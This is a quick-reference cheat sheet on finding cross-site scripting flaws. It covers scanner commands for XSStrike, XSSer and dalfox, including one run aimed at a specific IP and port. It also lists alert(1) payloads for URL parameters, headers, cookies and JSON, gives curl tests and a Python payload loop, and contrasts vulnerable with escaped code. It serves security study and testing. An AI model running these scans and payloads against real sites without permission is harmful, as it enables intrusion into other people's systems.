# XSS Discovery Quick Reference

## Discovery Methods

| Method | Difficulty | Accuracy | Speed |
|--------|-----------|----------|-------|
| **Automated Tools** | 🟢 Easy | 🟡 Medium | ⚡ Fast |
| **Manual Payloads** | 🟡 Medium | 🟡 Medium | 🐌 Slow |
| **Code Review** | 🔴 Hard | 🟢 High | 🐌 Very Slow |

## 1. Automated Discovery

### Commercial Tools
- **Burp Suite Pro** - Active/Passive scanning
- **Nessus** - Web app vulnerability scanner
- **Acunetix** - Comprehensive XSS detection
- **OWASP ZAP** - Free alternative

### Scan Types
**Passive Scan**:
- Reviews client-side code
- Finds DOM-based XSS
- No injection attempts

**Active Scan**:
- Injects payloads
- Tests server responses
- Compares rendered output

### Open-Source Tools

#### XSStrike
```bash
# Install
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt

# Basic scan
python xsstrike.py -u "http://target.com/page?param=test"

# With crawling
python xsstrike.py -u "http://target.com" --crawl

# Custom payload
python xsstrike.py -u "http://target.com?q=test" --payload "<script>alert(1)</script>"
```

#### Brute XSS
```bash
# Install
git clone https://github.com/rajeshmajumdar/BruteXSS.git
cd BruteXSS

# Run
python brutexss.py -u "http://target.com/page?param=test"

# With custom wordlist
python brutexss.py -u "http://target.com?q=test" -w payloads.txt
```

#### XSSer
```bash
# Install
apt install xsser

# Basic
xsser -u "http://target.com/page?param=test"

# Automatic
xsser --auto "http://target.com/page?param=test"

# Custom payload
xsser -u "http://target.com?q=test" --payload="<script>alert(1)</script>"

##Complex example
# Test fullname
xsser -u "http://94.237.120.137:36881/" -g "?fullname=XSS&username=test&password=test&email=test@gmail.com" --auto

# Test username
xsser -u "http://94.237.120.137:36881/" -g "?fullname=test&username=XSS&password=test&email=test@gmail.com" --auto

# Test password
xsser -u "http://94.237.120.137:36881/" -g "?fullname=test&username=test&password=XSS&email=test@gmail.com" --auto

# Test email (keep @ format)
xsser -u "http://94.237.120.137:36881/" -g "?fullname=test&username=test&password=test&email=XSS@gmail.com" --auto

```

#### dalfox
```bash
# Install
go install github.com/hahwul/dalfox/v2@latest

# Scan URL
dalfox url http://target.com/page?param=test

# File with URLs
dalfox file urls.txt

# Pipeline mode
cat urls.txt | dalfox pipe
```

## 2. Manual Discovery

### Step-by-Step Process

#### Step 1: Identify Input Points
```
- Form fields
- URL parameters
- HTTP headers (Cookie, User-Agent, Referer)
- File upload names/metadata
- JSON/XML inputs
- Hidden fields
```

#### Step 2: Test Basic Payload
```html
<script>alert(1)</script>
```

#### Step 3: Check Response
```
✅ Alert pops = Vulnerable
❌ No alert = Try other payloads
```

#### Step 4: Test Alternative Payloads
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
```

### Common Input Points

```bash
# URL parameters
?search=<script>alert(1)</script>
?name=<script>alert(1)</script>
?id=<script>alert(1)</script>

# Form fields
POST /comment
comment=<script>alert(1)</script>

# HTTP Headers
Cookie: session=<script>alert(1)</script>
User-Agent: <script>alert(1)</script>
Referer: <script>alert(1)</script>

# JSON
{"name":"<script>alert(1)</script>"}

# XML
<name><script>alert(1)</script></name>
```

### Payload Lists

#### PayloadAllTheThings
```bash
# Download
git clone https://github.com/swisskyrepo/PayloadsAllTheThings.git

# Location
PayloadsAllTheThings/XSS Injection/
```

#### PayloadBox
```bash
# Download
wget https://github.com/payloadbox/xss-payload-list/raw/master/Intruder/xss-payload-list.txt

# Use
cat xss-payload-list.txt
```

#### SecLists
```bash
# Location
/usr/share/seclists/Fuzzing/XSS/

# Files
XSS-Jhaddix.txt
XSS-BruteLogic.txt
XSS-Bypass-Strings-BruteLogic.txt
```

### Manual Testing Workflow

```bash
# 1. Find input field
http://target.com/search?q=test

# 2. Test basic payload
http://target.com/search?q=<script>alert(1)</script>

# 3. Check page source
curl "http://target.com/search?q=TEST" | grep "TEST"

# 4. If reflected, test XSS
# 5. Try alternative payloads if blocked
```

## 3. Code Review

### Front-End Review (DOM XSS)

#### Look for Sources
```javascript
// Dangerous sources
location.hash
location.search
document.URL
document.referrer
window.name
```

#### Look for Sinks
```javascript
// Dangerous sinks
document.write()
innerHTML
outerHTML
eval()
setTimeout()
setInterval()
```

#### Example Review
```javascript
// VULNERABLE
var search = location.hash.substring(1);
document.getElementById("output").innerHTML = search;

// Source: location.hash (user-controlled)
// Sink: innerHTML (no sanitization)
// Result: DOM XSS
```

### Back-End Review

#### PHP
```php
// VULNERABLE
<?php
echo $_GET['search'];
?>

// SAFE
<?php
echo htmlspecialchars($_GET['search'], ENT_QUOTES, 'UTF-8');
?>
```

#### JavaScript/Node.js
```javascript
// VULNERABLE
app.get('/search', (req, res) => {
  res.send('Results: ' + req.query.q);
});

// SAFE
const escape = require('escape-html');
app.get('/search', (req, res) => {
  res.send('Results: ' + escape(req.query.q));
});
```

#### Python
```python
# VULNERABLE
@app.route('/search')
def search():
    return 'Results: ' + request.args.get('q')

# SAFE
from markupsafe import escape
@app.route('/search')
def search():
    return 'Results: ' + escape(request.args.get('q'))
```

## Testing Strategies

### Strategy 1: Start Simple
```html
<!-- Level 1 -->
<script>alert(1)</script>

<!-- Level 2 -->
<img src=x onerror=alert(1)>

<!-- Level 3 -->
<svg onload=alert(1)>
```

### Strategy 2: Test All Input Types
```
✅ GET parameters
✅ POST parameters
✅ Cookies
✅ HTTP headers
✅ File uploads
✅ JSON/XML
✅ WebSocket messages
```

### Strategy 3: Check Different Contexts
```html
<!-- HTML context -->
<div>USER_INPUT</div>

<!-- Attribute context -->
<input value="USER_INPUT">

<!-- JavaScript context -->
<script>var x = "USER_INPUT";</script>

<!-- URL context -->
<a href="USER_INPUT">Click</a>

<!-- CSS context -->
<style>body{background:USER_INPUT}</style>
```

## Quick Test Commands

### Burp Suite
```
1. Proxy → Intercept
2. Send to Repeater
3. Modify parameter: param=<script>alert(1)</script>
4. Send
5. Check response
```

### cURL
```bash
# GET
curl "http://target.com/search?q=<script>alert(1)</script>"

# POST
curl -X POST http://target.com/comment -d "msg=<script>alert(1)</script>"

# Cookie
curl -H "Cookie: user=<script>alert(1)</script>" http://target.com

# User-Agent
curl -H "User-Agent: <script>alert(1)</script>" http://target.com
```

### Browser Console
```javascript
// Test in console
document.cookie = "<script>alert(1)</script>";
location.hash = "<script>alert(1)</script>";
```

## Custom Automation Script

```python
#!/usr/bin/env python3
import requests

url = "http://target.com/search"
payloads = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>"
]

for payload in payloads:
    params = {"q": payload}
    response = requests.get(url, params=params)
    
    if payload in response.text:
        print(f"[+] Potential XSS: {payload}")
        print(f"[+] URL: {response.url}")
    else:
        print(f"[-] Filtered: {payload}")
```

## Verification Checklist

✅ **Check for XSS**:
- [ ] Test all input fields
- [ ] Test URL parameters
- [ ] Test HTTP headers
- [ ] Test POST data
- [ ] Test file uploads
- [ ] Check for reflection
- [ ] Verify execution
- [ ] Test persistence (Stored XSS)

## Common False Positives

```html
<!-- Payload reflected but encoded -->
Input: <script>alert(1)</script>
Output: &lt;script&gt;alert(1)&lt;/script&gt;
Result: NOT vulnerable ❌

<!-- Payload reflected but CSP blocks -->
Input: <script>alert(1)</script>
Output: <script>alert(1)</script>
CSP: script-src 'self'
Result: NOT exploitable ❌

<!-- Payload in HTML comment -->
Input: <script>alert(1)</script>
Output: <!-- <script>alert(1)</script> -->
Result: NOT vulnerable ❌
```

## Tools Comparison

| Tool | Speed | Accuracy | Ease | DOM XSS |
|------|-------|----------|------|---------|
| **XSStrike** | ⚡⚡⚡ | 🎯🎯🎯 | 🟢 | ✅ |
| **Burp Pro** | ⚡⚡ | 🎯🎯🎯🎯 | 🟢 | ✅ |
| **dalfox** | ⚡⚡⚡ | 🎯🎯🎯 | 🟢 | ✅ |
| **ZAP** | ⚡⚡ | 🎯🎯 | 🟢 | ✅ |
| **XSSer** | ⚡⚡ | 🎯🎯 | 🟡 | ❌ |

## Best Practices

### For Penetration Testing
```
1. Start with automated scan
2. Verify findings manually
3. Test edge cases
4. Review source code if available
5. Document all findings
```

### For Bug Bounty
```
1. Focus on unique inputs
2. Test authenticated features
3. Check admin panels
4. Test file upload features
5. Review JavaScript files
```

## Key Points

🔴 **Remember**:
- Automated tools miss ~30-40% of XSS
- Always manually verify findings
- Test ALL input points (not just forms)
- HTTP headers can be vulnerable
- Code review = highest accuracy

🎯 **Priority Testing**:
1. Forms and search fields
2. URL parameters
3. HTTP headers (Cookie, User-Agent)
4. File upload metadata
5. JSON/XML inputs

